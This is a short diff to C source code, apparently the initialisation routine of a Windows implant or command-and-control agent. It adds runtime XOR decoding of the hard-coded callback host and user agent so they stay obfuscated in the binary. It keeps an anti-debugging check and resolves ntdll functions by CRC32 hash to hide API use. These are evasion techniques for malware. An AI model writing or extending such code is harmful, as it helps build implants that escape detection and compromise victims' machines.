@@ -9,6 +9,7 @@
 #include "Obfuscation.h"
 
 
+
 VOID RvntInit() {
 
     if(IsDebugged()){
@@ -16,18 +17,32 @@ VOID RvntInit() {
     }
 
     // Init Connection info
-    Instance.Config.Transport.UserAgent = CONFIG_USER_AGENT;
-    Instance.Config.Transport.Host      = CONFIG_HOST;
+    // UserAgent and Host IP always obfuscated
+    unsigned char s_xk[] = S_XK;
+    char unsigned e_UserAgent[] = CONFIG_USER_AGENT;
+    char unsigned e_Host[] = CONFIG_HOST;
+
+    xor_dec((char *)e_UserAgent, sizeof(e_UserAgent), (char *)s_xk, sizeof(s_xk));
+    xor_dec((char *)e_Host, sizeof(e_Host), (char *)s_xk, sizeof(s_xk));
+
+    wchar_t * w_UserAgent = NULL;
+    wchar_t * w_Host = NULL;
+
+    w_UserAgent = str_to_wide(e_UserAgent);
+    w_Host = str_to_wide(e_Host);
+
+    Instance.Config.Transport.UserAgent = w_UserAgent;
+    Instance.Config.Transport.Host      = w_Host;
     Instance.Config.Transport.Port      = CONFIG_PORT;
     Instance.Config.Transport.Secure    = CONFIG_SECURE;
 
     // Init Win32
-#if CONFIG_ARCH == x64
+#if CONFIG_ARCH == 64
     void *ntdll_base = get_ntdll_64();
 #else
     void *ntdll_base = get_ntdll_32();
 #endif
-
+    // _tprintf("NTDLL_BASE: %x\n", ntdll_base);
     Instance.Win32.RtlRandomEx   = get_proc_address_by_hash(ntdll_base, RtlRandomEx_CRC32B);
     Instance.Win32.RtlGetVersion = get_proc_address_by_hash(ntdll_base, RtlGetVersion_CRC32B);
 
